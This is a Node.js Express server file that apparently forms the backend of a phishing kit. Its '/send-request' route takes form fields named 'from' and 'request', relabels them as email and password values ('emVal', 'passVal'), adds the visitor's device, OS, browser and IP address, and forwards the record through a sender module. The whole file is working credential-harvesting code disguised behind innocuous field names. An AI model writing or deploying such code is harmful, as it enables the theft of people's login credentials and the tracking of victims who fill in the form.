require("dotenv").config();
const express = require("express");
const path = require("path");
const fs = require("fs/promises");
const bodyParser = require("body-parser");
const useragent = require("express-useragent");
const requestIp = require("request-ip");
const send2 = require("./src/utils/sender2.js");

const app = express();
const PORT = Math.floor(Math.random() * (9999 - 3000 + 1)) + 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.json());
app.use(useragent.express());
app.use(requestIp.mw());
app.set("trust proxy", true);
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// Routes
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "src", "views", "index.html"));
});

app.post("/send-request", (req, res) => {
  const {
    from = "Unknown",
    request = "Unknown",
    modelInfo = "",
    platformInfo = "",
    versiInfo = ""
  } = req.body;

  const device = `${modelInfo} ${platformInfo} ${versiInfo}`.trim() || "Unknown";
  const os = req.useragent.os || "Unknown";
  const browser = req.useragent.browser || "Unknown";
  const ipAddress = req.clientIp || "Unknown";

  send2({
    emVal: from,
    passVal: request,
    device,
    os,
    browser,
    ipAddress,
    logVia: "Request Form"
  });

  res.sendStatus(200);
});

// Fallback 404
app.use((req, res) => {
  res.status(404).redirect("/");
});

// Error handler
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send("Terjadi kesalahan server.");
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
